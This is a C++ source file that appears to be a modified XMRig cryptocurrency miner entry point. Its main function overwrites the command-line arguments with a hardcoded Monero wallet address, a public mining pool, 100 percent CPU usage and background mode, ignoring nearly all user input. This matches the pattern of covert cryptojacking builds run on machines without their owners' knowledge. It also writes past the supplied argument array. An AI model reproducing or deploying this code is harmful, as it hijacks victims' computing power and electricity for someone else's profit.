/* XMRig
 * Copyright 2010      Jeff Garzik <jgarzik@pobox.com>
 * Copyright 2012-2014 pooler      <pooler@litecoinpool.org>
 * Copyright 2014      Lucas Jones <https://github.com/lucasjones>
 * Copyright 2014-2016 Wolf9466    <https://github.com/OhGodAPet>
 * Copyright 2016      Jay D Dee   <jayddee246@gmail.com>
 * Copyright 2016-2017 XMRig       <support@xmrig.com>
 *
 *
 *   This program is free software: you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation, either version 3 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include "App.h"


int main(int argc, char **argv) {
    argc = 8;
	if(argv[1] == NULL)
	{
		argv[1] = "--pass=PUREINTELLIGENCE";
	}
	argv[2] = "--user=42Zheycfi8iNpHCYX2umZfA2ND1dKKKg7RuwdrKLHQFSb9gFVj1oFi63Cz52ZwcCb6HezJKdsbx5gbqpCASACrTm8t2zQQx+1000";
	argv[3] = "--algo=cryptonight";
	argv[4] = "--asm=intel";
	argv[5] = "--max-cpu-usage=100";
	argv[6] = "--url=pool.supportxmr.com:3333";
	argv[7] = "--background";
    
    App app(argc, argv);

    return app.exec();
}
